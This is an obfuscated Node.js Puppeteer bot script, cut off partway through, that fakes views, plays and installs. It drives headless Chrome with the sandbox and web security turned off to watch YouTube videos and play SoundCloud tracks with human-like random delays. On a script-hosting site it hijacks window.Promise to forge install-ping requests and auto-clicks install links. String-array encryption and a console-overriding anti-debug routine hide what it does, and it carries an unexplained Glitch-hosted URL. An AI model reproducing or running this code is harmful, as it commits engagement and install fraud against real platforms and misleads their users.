const a0 = d,
  Z = f,
  Y = h,
  b = (function() {
    let i = !![];
    return function(j, k) {
      const l = i ? function() {
        if (k) {
          const m = k['apply'](j, arguments);
          return k = null, m;
        }
      } : function() {};
      return i = ![], l;
    };
  }()),
  a = b(this, function() {
    const i = function() {
        let m;
        try {
          m = Function('return\x20(fu' + 'nction()\x20' + ('{}.constru' + 'ctor(\x22retu' + 'rn\x20this\x22)(' + '\x20)') + ');')();
        } catch (n) {
          m = window;
        }
        return m;
      },
      j = i(),
      k = j['console'] = j['console'] || {},
      l = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace'
      ];
    for (let m = 0x0; m < l['length']; m++) {
      const n = b['constructo' + 'r']['prototype']['bind'](b),
        o = l[m],
        p = k[o] || n;
      n['__proto__'] = b['bind'](b), n['toString'] = p['toString']['bind'](p), k[o] = n;
    }
  });
a();

function getRandomInt(i, j) {
  const k = ceil(i);
  return floor(random() * (floor(j) - k + 0x1)) + k;
}
async function createPage(i, j) {
  let k = await i['newPage']();
  return await k['setDefault' + 'Navigation' + 'Timeout'](0x0), await k['goto'](j, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), k;
}
async function standardGoto(i, j, k) {
  return await i['goto'](j, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), k ? await wait(0x7530 + 0x3a98 * random()) : await standardWaitForNetIdle(i), await wait(0x1388 + 0x2710 * random()), 0x1;
}

function c() {
  const bn = [
    't-button-s',
    '0.0.0\x20Safa',
    'UE0SXc5k1e',
    'u6RVZKcN9z',
    'BgvUz3rO',
    'contents',
    'oc4WlJaUmcbtyq',
    'rg/en/scri',
    'zgL1Bs5JB20Vqa',
    'zs81mwn0BY5JBW',
    'map',
    'EeJdNxmorSo/W4DKW5e',
    'lwjLyxv0Awz5lq',
    'ChrZl2j5lxnPDa',
    'CMCVzw4VC2nYAq',
    'xmowxdaiWQTFE21C',
    'xSkrsmk7W5xcICoIW6ywW4O',
    'WR7cMSo8EmkMiCkI',
    'BNrYzxbYzw5LDq',
    'y2XVC2u',
    'omkdyCkr',
    'b6gOcEwtZ8',
    'WQbMWOnFW7hdUmobkCoS',
    'Ahr0Chm6lY9NCG',
    'zNjVBq',
    'BudcNMrawCo/W5L1WO8',
    'split',
    'qw5KCM9PzcaXma',
    '-noeCjO416',
    'mZG3ytq2mW',
    'DY1VyZDgnu1TEq',
    'zs9KAxnJB3jKlG'
  ];
  c = function() {
    return bn;
  };
  return c();
}
async function standardWaitForNetIdle(i) {
  return await wait(0x1388), await i['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1;
}
async function randomWait() {
  return await wait(0x1388 + 0x1388 * random()), 0x1;
}
async function watchRandomFrontScreenVideo(i) {
  await i['evaluate'](() => {
    var k;
    (k = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x0, 0x7), k[Math['floor'](Math['random']() * k['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await i['click']('#__scope'), await standardWaitForNetIdle(i);
  const j = await getMaxTime(i);
  return await wait(Math['min'](0xea60 * getRandomInt(0x2, 0x5), j)), 0x1;
}
async function getMaxTime(i) {
  return await i['evaluate'](() => {
    const j = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let k = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      l = 0x0;
    k = k['split'](k['includes']('of') ? '\x20of\x20' : ',\x20')[0x1]['split']('\x20');
    for (let m = 0x0; m < k['length']; m += 0x2)
      l += k[m] * j[k[m + 0x1]];
    return l;
  });
}
async function anchorAndView(i) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(i, channels['random']()), await i['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(i), log('page\x20netwo' + 'rk\x20idle\x20x2'), await i['evaluate'](() => {
    const O = h,
      l = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](n => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == n['getAttribu' + 'te']('class'))['slice'](0x6)[O(0xa)](n => Array['from'](n['children']))['flat'](0x1)['map'](n => n['childNodes'][0x1]['childNodes'][0x0]['childNodes'][0x1]['childNodes'][0x0]['childNodes'][0x1]);
    var m;
    return (m = l)[Math['floor'](Math['random']() * m['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), l['map'](n => n['href']);
  }), await wait(getRandomInt(0x3e8, 0x1388)), await i['click']('#__hookedV' + 'idToWatch'), await wait(0x3a98);
  const j = await getMaxTime(i),
    k = Math['min'](0xea60 * getRandomInt(0x2, 0x5), j);
  return await wait(k), 0x1;
}
async function frontScreenActions(i) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(i), await randomWait(), log('click\x20atte' + 'mpt...'), await i['evaluate'](() => {
    const P = h;
    var j;
    (j = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](k => P(0x5) != k['id']), j[Math['floor'](Math['random']() * j['length'])])['children'][0x0]['children'][0x0]['children'][0x0]['children'][0x0]['children'][0x0]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await i['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(i), await watchRandomFrontScreenVideo(i), 0x1;
}
async function searchAndView(i) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await i['evaluate'](() => {
    let l = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || l['find'](m => 'INPUT' === m['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await i['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x64 + 0x32 * random()
  }), await wait(0x1f4 + 0x12c * random()), await i['click']('#search-ic' + 'on-legacy'), await async function l() {
    if (!await i['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await l();
  }(), await standardWaitForNetIdle(i);
  let j = await i['evaluate'](() => {
    const Q = f,
      m = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      n = (p = Array[Q(0x18)](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](r => r['childNodes'][0x2]['childNodes'][0x1]['childNodes'][0x1]))[Math['floor'](Math['random']() * p['length'])];
    var p;
    const q = n['childNodes'][0x5]['childNodes'][0x0]['childNodes'][0x2]['ariaLabel'];
    return n['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), n['scrollInto' + 'View'](),
      function(r) {
        let u = r['split'](',\x20')['map'](w => w['split']('\x20'))['flat'](0x1),
          v = 0x0;
        for (let w = 0x0; w < u['length']; w += 0x2)
          v += u[w] * m[u[w + 0x1]];
        return v;
      }(q);
  });
  await wait(0x3a98 * Math['random']()), await i['click']('#__hookedV' + 'idToClick');
  let k = Math['min'](0xea60 * getRandomInt(0x1, 0xa), j + 0x1388);
  return await wait(k), 0x1;
}
async function keyWatch(i) {
  const R = h;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(i, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x0), log('clicking..' + '.'), await i['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await i['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + R(0x0) + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const j = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await i['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xbb8 + 0x3e8 * Math['random']());
    });
  }, 0x1b58);
  await wait(0x493e0);
  try {
    await i['click']('#__lllll');
  } catch (k) {}
  return await wait(0xea60 * getRandomInt(0x4, 0x19)), clearInterval(j), 0x1;
}
async function runYTModule(i, j) {
  const k = await createPage(i, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let l = 0x0;
    try {
      await standardWaitForNetIdle(k), await GlobalActions['random']()(k);
    } catch (m) {
      k['close']();
    }
    if (l)
      return 0x1;
    await randomWait();
  }
  return 0x1;
}

function h(a, b) {
  const d = c();
  return h = function(e, f) {
    e = e - 0x0;
    let g = d[e];
    return g;
  }, h(a, b);
}

function fetchRandomSC() {
  const S = d;
  return Math['random']() <= 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + S(0x10, 'fl^B') + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(a, b) {
  const e = c();
  return d = function(f, g) {
    f = f - 0x0;
    let h = e[f];
    if (d['DmBVdn'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x0, s, t, u = 0x0; t = n['charAt'](u++); ~t && (s = r % 0x4 ? s * 0x40 + t : t, r++ % 0x4) ? p += String['fromCharCode'](0xff & s >> (-0x2 * r & 0x6)) : 0x0) {
          t = o['indexOf'](t);
        }
        for (let v = 0x0, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x10))['slice'](-0x2);
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x0,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x0; u < 0x100; u++) {
          p[u] = u;
        }
        for (u = 0x0; u < 0x100; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % 0x100, r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x0, q = 0x0;
        for (let v = 0x0; v < n['length']; v++) {
          u = (u + 0x1) % 0x100, q = (q + p[u]) % 0x100, r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % 0x100]);
        }
        return t;
      };
      d['azBABP'] = m, a = arguments, d['DmBVdn'] = !![];
    }
    const j = e[0x0],
      k = f + j,
      l = a[k];
    return !l ? (d['vmusxK'] === undefined && (d['vmusxK'] = !![]), h = d['azBABP'](h, g), a[k] = h) : h = l, h;
  }, d(a, b);
}
async function runGFModule(i, j) {
  async function k() {
    const X = f;
    if (Math['random']() <= 0.4 && doFlags['doSC']) {
      const {
        url: l,
        preRef: m
      } = scriptTargets['randomFlus' + 'h'](0x1), n = await i['createInco' + 'gnitoBrows' + 'erContext'](), p = await n['newPage']();
      let q = 0x0;
      if (await p['goto'](m, {
          'timeout': NETWORK_PATIENCE
        })['catch'](s => q++), q)
        return await p['close'](), await n['close'](), k();
      const r = await p['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(r['slice'](0x0, 0x32)), r['includes']('script-des' + 'cription') ? (log('p1'), await p['goto'](l, {
        'timeout': NETWORK_PATIENCE
      })['catch'](s => q++), q ? (await p['close'](), await n['close'](), k()) : (await new Promise(s => setTimeout(s, 0x7d0 + floor(0x3e8 * random()))), log('p2'), log(await p['evaluate'](() => {
        const T = h;
        var s, u, v, w, x, y, z, A, B = 'object' == typeof window ? window : {},
          C = !B['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        C && (B = global), s = ('0123456789' + 'abcdef')[T(0x1a)](''), u = [
          -0x80000000,
          0x800000,
          0x8000,
          0x80
        ], v = [
          0x18,
          0x10,
          0x8,
          0x0
        ], w = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], x = [], y = function(G) {
          return function(H) {
            return new D(0x1)['update'](H)[G]();
          };
        }, z = function() {
          const U = f;
          var G, H, I = y('hex');
          for (C && (I = A(I)), I['create'] = function() {
              return new D();
            }, I['update'] = function(J) {
              return I['create']()['update'](J);
            }, G = 0x0; G < w[U(0x4)]; ++G)
            H = w[G], I[H] = y(H);
          return I;
        }, A = function(G) {
          var H = eval('require(\'crypto\');'),
            I = eval('require(\'buffer\')[\'Buffer\'];'),
            J = function(K) {
              if ('string' == typeof K)
                return H['createHash']('sha1')['update'](K, 'utf8')['digest']('hex');
              if (K['constructo' + 'r'] === ArrayBuffer)
                K = new Uint8Array(K);
              else {
                if (void 0x0 === K['length'])
                  return G(K);
              }
              return H['createHash']('sha1')['update'](new I(K))['digest']('hex');
            };
          return J;
        };
        class D {
          constructor(G) {
              G ? (x[0x0] = x[0x10] = x[0x1] = x[0x2] = x[0x3] = x[0x4] = x[0x5] = x[0x6] = x[0x7] = x[0x8] = x[0x9] = x[0xa] = x[0xb] = x[0xc] = x[0xd] = x[0xe] = x[0xf] = 0x0, this['blocks'] = x) : this['blocks'] = [
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0,
                0x0
              ], this['h0'] = 0x67452301, this['h1'] = 0xefcdab89, this['h2'] = 0x98badcfe, this['h3'] = 0x10325476, this['h4'] = 0xc3d2e1f0, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x0, this['finalized'] = this['hashed'] = 0x0, this['first'] = 0x1;
            }
            ['update'](G) {
              const V = d;
              var H, I, J, K, L, M;
              if (!this['finalized']) {
                for ((H = 'string' != typeof G) && G['constructo' + 'r'] === B['ArrayBuffe' + 'r'] && (G = new Uint8Array(G)), J = 0x0, L = G['length'] || 0x0, M = this['blocks']; J < L;) {
                  if (this['hashed'] && (this['hashed'] = 0x0, M[0x0] = this['block'], M[0x10] = M[0x1] = M[0x2] = M[0x3] = M[0x4] = M[0x5] = M[0x6] = M[0x7] = M[0x8] = M[0x9] = M[0xa] = M[0xb] = M[0xc] = M[0xd] = M[0xe] = M[0xf] = 0x0), H) {
                    for (K = this['start']; J < L && K < 0x40; ++J)
                      M[K >> 0x2] |= G[J] << v[0x3 & K++];
                  } else {
                    for (K = this['start']; J < L && K < 0x40; ++J)
                      (I = G['charCodeAt'](J)) < 0x80 ? M[K >> 0x2] |= I << v[0x3 & K++] : I < 0x800 ? (M[K >> 0x2] |= (0xc0 | I >> 0x6) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | 0x3f & I) << v[0x3 & K++]) : I < 0xd800 || I >= 0xe000 ? (M[K >> 0x2] |= (0xe0 | I >> 0xc) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | I >> 0x6 & 0x3f) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | 0x3f & I) << v[0x3 & K++]) : (I = 0x10000 + ((0x3ff & I) << 0xa | 0x3ff & G['charCodeAt'](++J)), M[K >> 0x2] |= (0xf0 | I >> 0x12) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | I >> 0xc & 0x3f) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | I >> 0x6 & 0x3f) << v[0x3 & K++], M[K >> 0x2] |= (0x80 | 0x3f & I) << v[0x3 & K++]);
                  }
                  this['lastByteIn' + 'dex'] = K, this['bytes'] += K - this['start'], K >= 0x40 ? (this['block'] = M[0x10], this['start'] = K - 0x40, this[V(0x14, 'G5Ph')](), this['hashed'] = 0x1) : this['start'] = K;
                }
                return this['bytes'] > 0xffffffff && (this['hBytes'] += this['bytes'] / 0x100000000 << 0x0, this['bytes'] = this['bytes'] % 0x100000000), this;
              }
            }
            ['finalize']() {
              const W = d;
              if (!this['finalized']) {
                this[W(0x16, 'K125')] = 0x1;
                var G = this['blocks'],
                  H = this['lastByteIn' + 'dex'];
                G[0x10] = this['block'], G[H >> 0x2] |= u[0x3 & H], this['block'] = G[0x10], H >= 0x38 && (this['hashed'] || this['hash'](), G[0x0] = this['block'], G[0x10] = G[0x1] = G[0x2] = G[0x3] = G[0x4] = G[0x5] = G[0x6] = G[0x7] = G[0x8] = G[0x9] = G[0xa] = G[0xb] = G[0xc] = G[0xd] = G[0xe] = G[0xf] = 0x0), G[0xe] = this['hBytes'] << 0x3 | this['bytes'] >>> 0x1d, G[0xf] = this['bytes'] << 0x3, this['hash']();
              }
            }
            ['hash']() {
              var G, H, I = this['h0'],
                J = this['h1'],
                K = this['h2'],
                L = this['h3'],
                M = this['h4'],
                N = this['blocks'];
              for (G = 0x10; G < 0x50; ++G)
                H = N[G - 0x3] ^ N[G - 0x8] ^ N[G - 0xe] ^ N[G - 0x10], N[G] = H << 0x1 | H >>> 0x1f;
              for (G = 0x0; G < 0x14; G += 0x5)
                I = (H = (J = (H = (K = (H = (L = (H = (M = (H = I << 0x5 | I >>> 0x1b) + (J & K | ~J & L) + M + 0x5a827999 + N[G] << 0x0) << 0x5 | M >>> 0x1b) + (I & (J = J << 0x1e | J >>> 0x2) | ~I & K) + L + 0x5a827999 + N[G + 0x1] << 0x0) << 0x5 | L >>> 0x1b) + (M & (I = I << 0x1e | I >>> 0x2) | ~M & J) + K + 0x5a827999 + N[G + 0x2] << 0x0) << 0x5 | K >>> 0x1b) + (L & (M = M << 0x1e | M >>> 0x2) | ~L & I) + J + 0x5a827999 + N[G + 0x3] << 0x0) << 0x5 | J >>> 0x1b) + (K & (L = L << 0x1e | L >>> 0x2) | ~K & M) + I + 0x5a827999 + N[G + 0x4] << 0x0, K = K << 0x1e | K >>> 0x2;
              for (; G < 0x28; G += 0x5)
                I = (H = (J = (H = (K = (H = (L = (H = (M = (H = I << 0x5 | I >>> 0x1b) + (J ^ K ^ L) + M + 0x6ed9eba1 + N[G] << 0x0) << 0x5 | M >>> 0x1b) + (I ^ (J = J << 0x1e | J >>> 0x2) ^ K) + L + 0x6ed9eba1 + N[G + 0x1] << 0x0) << 0x5 | L >>> 0x1b) + (M ^ (I = I << 0x1e | I >>> 0x2) ^ J) + K + 0x6ed9eba1 + N[G + 0x2] << 0x0) << 0x5 | K >>> 0x1b) + (L ^ (M = M << 0x1e | M >>> 0x2) ^ I) + J + 0x6ed9eba1 + N[G + 0x3] << 0x0) << 0x5 | J >>> 0x1b) + (K ^ (L = L << 0x1e | L >>> 0x2) ^ M) + I + 0x6ed9eba1 + N[G + 0x4] << 0x0, K = K << 0x1e | K >>> 0x2;
              for (; G < 0x3c; G += 0x5)
                I = (H = (J = (H = (K = (H = (L = (H = (M = (H = I << 0x5 | I >>> 0x1b) + (J & K | J & L | K & L) + M - 0x70e44324 + N[G] << 0x0) << 0x5 | M >>> 0x1b) + (I & (J = J << 0x1e | J >>> 0x2) | I & K | J & K) + L - 0x70e44324 + N[G + 0x1] << 0x0) << 0x5 | L >>> 0x1b) + (M & (I = I << 0x1e | I >>> 0x2) | M & J | I & J) + K - 0x70e44324 + N[G + 0x2] << 0x0) << 0x5 | K >>> 0x1b) + (L & (M = M << 0x1e | M >>> 0x2) | L & I | M & I) + J - 0x70e44324 + N[G + 0x3] << 0x0) << 0x5 | J >>> 0x1b) + (K & (L = L << 0x1e | L >>> 0x2) | K & M | L & M) + I - 0x70e44324 + N[G + 0x4] << 0x0, K = K << 0x1e | K >>> 0x2;
              for (; G < 0x50; G += 0x5)
                I = (H = (J = (H = (K = (H = (L = (H = (M = (H = I << 0x5 | I >>> 0x1b) + (J ^ K ^ L) + M - 0x359d3e2a + N[G] << 0x0) << 0x5 | M >>> 0x1b) + (I ^ (J = J << 0x1e | J >>> 0x2) ^ K) + L - 0x359d3e2a + N[G + 0x1] << 0x0) << 0x5 | L >>> 0x1b) + (M ^ (I = I << 0x1e | I >>> 0x2) ^ J) + K - 0x359d3e2a + N[G + 0x2] << 0x0) << 0x5 | K >>> 0x1b) + (L ^ (M = M << 0x1e | M >>> 0x2) ^ I) + J - 0x359d3e2a + N[G + 0x3] << 0x0) << 0x5 | J >>> 0x1b) + (K ^ (L = L << 0x1e | L >>> 0x2) ^ M) + I - 0x359d3e2a + N[G + 0x4] << 0x0, K = K << 0x1e | K >>> 0x2;
              this['h0'] = this['h0'] + I << 0x0, this['h1'] = this['h1'] + J << 0x0, this['h2'] = this['h2'] + K << 0x0, this['h3'] = this['h3'] + L << 0x0, this['h4'] = this['h4'] + M << 0x0;
            }
            ['hex']() {
              this['finalize']();
              var G = this['h0'],
                H = this['h1'],
                I = this['h2'],
                J = this['h3'],
                K = this['h4'];
              return s[G >> 0x1c & 0xf] + s[G >> 0x18 & 0xf] + s[G >> 0x14 & 0xf] + s[G >> 0x10 & 0xf] + s[G >> 0xc & 0xf] + s[G >> 0x8 & 0xf] + s[G >> 0x4 & 0xf] + s[0xf & G] + s[H >> 0x1c & 0xf] + s[H >> 0x18 & 0xf] + s[H >> 0x14 & 0xf] + s[H >> 0x10 & 0xf] + s[H >> 0xc & 0xf] + s[H >> 0x8 & 0xf] + s[H >> 0x4 & 0xf] + s[0xf & H] + s[I >> 0x1c & 0xf] + s[I >> 0x18 & 0xf] + s[I >> 0x14 & 0xf] + s[I >> 0x10 & 0xf] + s[I >> 0xc & 0xf] + s[I >> 0x8 & 0xf] + s[I >> 0x4 & 0xf] + s[0xf & I] + s[J >> 0x1c & 0xf] + s[J >> 0x18 & 0xf] + s[J >> 0x14 & 0xf] + s[J >> 0x10 & 0xf] + s[J >> 0xc & 0xf] + s[J >> 0x8 & 0xf] + s[J >> 0x4 & 0xf] + s[0xf & J] + s[K >> 0x1c & 0xf] + s[K >> 0x18 & 0xf] + s[K >> 0x14 & 0xf] + s[K >> 0x10 & 0xf] + s[K >> 0xc & 0xf] + s[K >> 0x8 & 0xf] + s[K >> 0x4 & 0xf] + s[0xf & K];
            }
            ['digest']() {
              this['finalize']();
              var G = this['h0'],
                H = this['h1'],
                I = this['h2'],
                J = this['h3'],
                K = this['h4'];
              return [
                G >> 0x18 & 0xff,
                G >> 0x10 & 0xff,
                G >> 0x8 & 0xff,
                0xff & G,
                H >> 0x18 & 0xff,
                H >> 0x10 & 0xff,
                H >> 0x8 & 0xff,
                0xff & H,
                I >> 0x18 & 0xff,
                I >> 0x10 & 0xff,
                I >> 0x8 & 0xff,
                0xff & I,
                J >> 0x18 & 0xff,
                J >> 0x10 & 0xff,
                J >> 0x8 & 0xff,
                0xff & J,
                K >> 0x18 & 0xff,
                K >> 0x10 & 0xff,
                K >> 0x8 & 0xff,
                0xff & K
              ];
            }
            ['arrayBuffe' + 'r']() {
              var G, H;
              return this['finalize'](), G = new ArrayBuffer(0x14), (H = new DataView(G))['setUint32'](0x0, this['h0']), H['setUint32'](0x4, this['h1']), H['setUint32'](0x8, this['h2']), H['setUint32'](0xc, this['h3']), H['setUint32'](0x10, this['h4']), G;
            }
        }
        D['prototype']['toString'] = D['prototype']['hex'], D['prototype']['array'] = D['prototype']['digest'];
        const E = z();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let F = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x0];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...G) {
            let H = 0x0;
            G[0x0]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (G[0x0] = I => {
              let J = F['getAttribu' + 'te']('data-ping-' + 'url');
              if (J) {
                let K = E(F['getAttribu' + 'te']('data-ip-ad' + 'dress') + F['getAttribu' + 'te']('data-scrip' + 't-id') + F['getAttribu' + 'te']('data-ping-' + 'key')),
                  L = new XMLHttpRequest();
                L['open']('POST', J + ('&mo=3&ping' + '_key=') + encodeURIComponent(K), 0x1), L['overrideMi' + 'meType']('text/plain'), L['onload'] = () => {}, L['send'](), H = 0x1;
              }
            }), H || super(...G);
          }
        }, window['setTimeout'](() => {
          F['click']();
        }, 0x5dc), Promise['resolve'](0x1);
      })), log('after...'), await new Promise(s => setTimeout(s, NETWORK_PATIENCE)), await p['close'](), await n['close'](), k())) : (await p[X(0x13)](), await n['close'](), k());
    } {
      const s = await i['createInco' + 'gnitoBrows' + 'erContext'](),
        u = await s['newPage']();
      let v = 0x0;
      if (await u['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => v++), v)
        return await u['close'](), await s['close'](), k();
      try {
        const w = await u['evaluate'](() => {
          let x = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          x && 'Play' === x['textConten' + 't'] && x['click']();
        });
        await wait(0xafc8 + getRandomInt(0x3a98, 0x7530));
      } catch (x) {}
      return await u['close'](), await s['close'](), k();
    }
  }
  for (let l = 0x0; l < 0x1; l++)
    k();
}
const NETWORK_PATIENCE = 0x1f40 + 0xbb8 * Math['random'](),
  MM_NETWORK_PATIENCE = 0x3 * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doGF': 0x1,
    'doYT': 0x0,
    'doNetOnly': 0x1,
    'doPageLoader': 0x1,
    'doOUJS': 0x1,
    'doRemoteCaptcha': 0x1,
    'doDual': 0x0,
    'doSC': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function f(a, b) {
  const d = c();
  return f = function(e, g) {
    e = e - 0x0;
    let h = d[e];
    if (f['iltMpV'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x0, r, s, t = 0x0; s = m['charAt'](t++); ~s && (r = q % 0x4 ? r * 0x40 + s : s, q++ % 0x4) ? o += String['fromCharCode'](0xff & r >> (-0x2 * q & 0x6)) : 0x0) {
          s = n['indexOf'](s);
        }
        for (let u = 0x0, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);
        }
        return decodeURIComponent(p);
      };
      f['hEHQDY'] = i, a = arguments, f['iltMpV'] = !![];
    }
    const j = d[0x0],
      k = e + j,
      l = a[k];
    return !l ? (h = f['hEHQDY'](h), a[k] = h) : h = l, h;
  }, f(a, b);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
